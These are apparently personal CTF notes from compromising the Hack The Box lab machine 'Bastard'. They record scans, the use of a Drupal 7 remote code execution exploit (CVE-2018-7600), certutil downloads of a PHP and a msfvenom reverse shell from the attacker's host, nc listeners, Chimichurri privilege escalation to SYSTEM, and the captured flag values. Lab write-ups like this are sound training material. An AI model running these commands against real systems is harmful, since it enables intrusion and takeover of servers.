```


Bastard - HTB - Medium - Success
IP: 10.10.10.9
Exploit used: https://github.com/pimps/CVE-2018-7600
Priv Esc Used: ChimiChurri

Lessons Learned:
Struggled with initial access on this box, ended up running with https://github.com/pimps/CVE-2018-7600 and the privilege escalation was fairly simple with chimichurri and winpeas.bat.

```

```
3:35 PM 1/22/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# nmap -sC -sV  10.10.10.9 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 20:35 EST
Nmap scan report for 10.10.10.9
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.71 seconds
```

```
3:37 PM 1/22/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# gobuster dir -u http://10.10.10.9:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64   
```

```
3:38 PM 1/22/2023
http://10.10.10.9/													= Bastard Login page
```

```
3:38 PM 1/22/2023
http://10.10.10.9/robots.txt

									#
									# robots.txt
									#
									# This file is to prevent the crawling and indexing of certain parts
									# of your site by web crawlers and spiders run by sites like Yahoo!
									# and Google. By telling these "robots" where not to go on your site,
									# you save bandwidth and server resources.
									#
									# This file will be ignored unless it is at the root of your host:
									# Used:    http://example.com/robots.txt
									# Ignored: http://example.com/site/robots.txt
									#
									# For more information about the robots.txt standard, see:
									# http://www.robotstxt.org/robotstxt.html

									User-agent: *
									Crawl-delay: 10
									# CSS, JS, Images
									Allow: /misc/*.css$
									Allow: /misc/*.css?
									Allow: /misc/*.js$
									Allow: /misc/*.js?
									Allow: /misc/*.gif
									Allow: /misc/*.jpg
									Allow: /misc/*.jpeg
									Allow: /misc/*.png
									Allow: /modules/*.css$
									Allow: /modules/*.css?
									Allow: /modules/*.js$
									Allow: /modules/*.js?
									Allow: /modules/*.gif
									Allow: /modules/*.jpg
									Allow: /modules/*.jpeg
									Allow: /modules/*.png
									Allow: /profiles/*.css$
									Allow: /profiles/*.css?
									Allow: /profiles/*.js$
									Allow: /profiles/*.js?
									Allow: /profiles/*.gif
									Allow: /profiles/*.jpg
									Allow: /profiles/*.jpeg
									Allow: /profiles/*.png
									Allow: /themes/*.css$
									Allow: /themes/*.css?
									Allow: /themes/*.js$
									Allow: /themes/*.js?
									Allow: /themes/*.gif
									Allow: /themes/*.jpg
									Allow: /themes/*.jpeg
									Allow: /themes/*.png
									# Directories
									Disallow: /includes/
									Disallow: /misc/
									Disallow: /modules/
									Disallow: /profiles/
									Disallow: /scripts/
									Disallow: /themes/
									# Files
									Disallow: /CHANGELOG.txt
									Disallow: /cron.php
									Disallow: /INSTALL.mysql.txt
									Disallow: /INSTALL.pgsql.txt
									Disallow: /INSTALL.sqlite.txt
									Disallow: /install.php
									Disallow: /INSTALL.txt
									Disallow: /LICENSE.txt
									Disallow: /MAINTAINERS.txt
									Disallow: /update.php
									Disallow: /UPGRADE.txt
									Disallow: /xmlrpc.php
									# Paths (clean URLs)
									Disallow: /admin/
									Disallow: /comment/reply/
									Disallow: /filter/tips/
									Disallow: /node/add/
									Disallow: /search/
									Disallow: /user/register/
									Disallow: /user/password/
									Disallow: /user/login/
									Disallow: /user/logout/
									# Paths (no clean URLs)
									Disallow: /?q=admin/
									Disallow: /?q=comment/reply/
									Disallow: /?q=filter/tips/
									Disallow: /?q=node/add/
									Disallow: /?q=search/
									Disallow: /?q=user/password/
									Disallow: /?q=user/register/
									Disallow: /?q=user/login/
									Disallow: /?q=user/logout/
									
```
```
#deleted tons of op notes that led no where.

4:33 PM 1/22/2023
too confusing going to go a different route.
```

```

4:50 PM 1/22/2023													# found from walkthrough, but also from throwing "drupal 7.54 exploit github" into google
https://github.com/pimps/CVE-2018-7600

```

```
4:51 PM 1/22/2023
had to down load both binaries below

pip install requests
pip install bs4
```

```
4:52 PM 1/22/2023															# downloaded file
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# ls
drupa7-CVE-2018-7600.py
```

```
4:54 PM 1/22/2023																		# used exploit get user info
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c whoami 

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-FwJ2o4VSZvV5hfx8bY8weSJ1AC5ks_qLl-q3XJlWXqY
[*] Triggering exploit to execute: whoami
nt authority\iusr
```

```
4:55 PM 1/22/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c dir    

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-yP11cbm_YYUIXC24U58xJ8GqebbwMBAMP373tPnV9n8
[*] Triggering exploit to execute: dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\inetpub\drupal-7.54

23/01/2023  04:22 ��    <DIR>          .
23/01/2023  04:22 ��    <DIR>          ..
19/03/2017  12:42 ��               317 .editorconfig
19/03/2017  12:42 ��               174 .gitignore
19/03/2017  12:42 ��             5.969 .htaccess
19/03/2017  12:42 ��             6.604 authorize.php
19/03/2017  12:42 ��           110.781 CHANGELOG.txt
19/03/2017  12:42 ��             1.481 COPYRIGHT.txt
19/03/2017  12:42 ��               720 cron.php
19/03/2017  12:43 ��    <DIR>          includes
19/03/2017  12:42 ��               529 index.php
19/03/2017  12:42 ��             1.717 INSTALL.mysql.txt
19/03/2017  12:42 ��             1.874 INSTALL.pgsql.txt
19/03/2017  12:42 ��               703 install.php
19/03/2017  12:42 ��             1.298 INSTALL.sqlite.txt
19/03/2017  12:42 ��            17.995 INSTALL.txt
19/03/2017  12:42 ��            18.092 LICENSE.txt
19/03/2017  12:42 ��             8.710 MAINTAINERS.txt
19/03/2017  12:43 ��    <DIR>          misc
19/03/2017  12:43 ��    <DIR>          modules
19/03/2017  12:43 ��    <DIR>          profiles
19/03/2017  12:42 ��             5.382 README.txt
19/03/2017  12:42 ��             2.189 robots.txt
19/03/2017  12:43 ��    <DIR>          scripts
19/03/2017  12:43 ��    <DIR>          sites
23/01/2023  04:25 ��                28 testys.php
19/03/2017  12:43 ��    <DIR>          themes
19/03/2017  12:42 ��            19.986 update.php
19/03/2017  12:42 ��            10.123 UPGRADE.txt
19/03/2017  12:42 ��             2.200 web.config
19/03/2017  12:42 ��               417 xmlrpc.php
              22 File(s)        217.289 bytes
               9 Dir(s)   4.135.018.496 bytes free
```

```
5:00 PM 1/22/2023																				
# hosting server to try to put php-reverse-shell.php on
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
5:01 PM 1/22/2023																				
# putting reverse shell onto box
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c "certutil -urlcache -f http://10.10.16.11:8000/php-reverse-shell.php php-reverse-shell.php"
```

```
5:03 PM 1/22/2023

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c dir
```

```
5:04 PM 1/22/2023																			
# SUCCESS! ON UPLOAD
23/01/2023  05:02 ��             5.494 php-reverse-shell.php
```

```
5:04 PM 1/22/2023																							# nc listener			
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 1234
listening on [any] 1234 ...
```

```
5:06 PM 1/22/2023
attempting to trigger php-reverse-shell.php																	# didnt work, trying again
```

```
5:08 PM 1/22/2023																							# pulled a system info.
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastard	]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c systeminfo             

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-r3pM6VbrFK8X-s8oa2QZX674f328171SnKrq1kUaeZM
[*] Triggering exploit to execute: systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          23/1/2023, 3:33:02 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC																			# x64, gooing to try again with not a php shell but a msfvenom/x64/
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.542 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.558 MB
Virtual Memory: In Use:    537 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
								 
```

```
5:09 PM 1/22/2023
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.11 LPORT=4444 -f exe > lool.exe
```

```
5:11 PM 1/22/2023																							# xferring msfvenom payload
python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c "certutil -urlcache -f http://10.10.16.11:8000/lool.exe lool.exe"
```

```
5:12 PM 1/22/2023																				# successfully xferred
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.9 - - [22/Jan/2023 22:12:16] "GET /lool.exe HTTP/1.1" 200 -
10.10.10.9 - - [22/Jan/2023 22:12:16] "GET /lool.exe HTTP/1.1" 200 -
```

```
5:12 PM 1/22/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 4444
listening on [any] 4444 ...
```

```
5:13 PM 1/22/2023															# activating shellcode
python3 drupa7-CVE-2018-7600.py http://10.10.10.9/ -c lool.exe
```

```
5:14 PM 1/22/2023															# on box with a shell
㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.9] 52519
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>
```

```
5:14 PM 1/22/2023																					
# pulling winPEAS onto box.
certutil -urlcache -f http://10.10.16.11:8000/winPEAS.bat winPEAS.bat
```

```
5:20 PM 1/22/2023																					# winpeas results, trying chimichurri.
0-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)											# save winpeas results to [/home/kali/Documents/hackthebox/bastard]
No Instance(s) Available.
```

```
5:24 PM 1/22/2023
certutil -urlcache -f http://10.10.16.11:8000/Chimichurri.exe Chimichurri.exe						
```

```
5:26 PM 1/22/2023																						# successfuly xferred chimichurri onto box
C:\inetpub\drupal-7.54>dir | findstr "Chimichurri.exe"
dir | findstr "Chimichurri.exe"
23/01/2023  05:25 ��           784.384 Chimichurri.exe

C:\inetpub\drupal-7.54>
```

```
5:27 PM 1/22/2023																						# opening an additional nc for chimichurri.exe
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 1212           
listening on [any] 1212 ...
```

```
5:27 PM 1/22/2023
inetpub\drupal-7.54>Chimichurri.exe 10.10.16.11 1212													# running cmd
Chimichurri.exe 10.10.16.11 1212
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\inetpub\drupal-7.54>
```

```
5:29 PM 1/22/2023																		# on system.
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>
```

```
# Struggled with initial access on this box, ended up running with https://github.com/pimps/CVE-2018-7600 and the privilege escalation was fairly simple with chimichurri and winpeas.bat.
```

```
5:30 PM 1/22/2023																						# root.txt
sers\Administrator\Desktop>type root.txt
type root.txt
f9a5a6c055865f497dec5b7f6811dd75


5:31 PM 1/22/2023
C:\Users\dimitris\Desktop>type user.txt																	# user.txt
type user.txt
e5c4659d8dde3a3eef38bb9e9d2a4d45
```

